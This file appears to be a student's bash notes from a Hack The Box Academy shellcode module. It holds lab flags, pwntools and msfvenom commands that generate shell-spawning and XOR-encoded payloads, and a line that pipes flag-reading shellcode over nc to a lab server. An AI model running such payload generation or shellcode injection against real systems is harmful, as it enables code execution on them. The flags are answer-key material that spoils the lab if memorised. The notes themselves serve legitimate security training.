#!/bin/bash


# Assessment 1 https://academy.hackthebox.com/module/85/section/909
# xor rbx with stack
assf ./src/fix-loaded-shellcode.s
# get the shellcode in the debugger (so easy to copy wrong)
loader.py 4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05
#HTB{4553mbly_d3bugg1ng_m4573r}


# ------------------------------------

pwn asm 'push rax' -c 'amd64'
# > 50

pwn disasm '50' -c 'amd64'
# > 0: 50       push rax


pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05' -c 'amd64'

pwn shellcraft amd64.linux.sh

pwn shellcraft amd64.linux.sh -r

#spawn shell
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'

#encoders
msfvenom -l encoders

#encode
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'

for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n $i; done; echo;

#server shell code injection - print-flag
echo -n -e "4883ec0848bf666c61672e7478745748bf2f2f2f2f2f2f2f2f57b0024889e74831f60f054883ec404883ec404883ec404889e64889c74831c0b2800f0588c2b00140b7010f05b03c4831ff0f05" | nc 94.237.55.109 30327
# HTB{r3m073_5h3llc0d3_3x3cu710n}
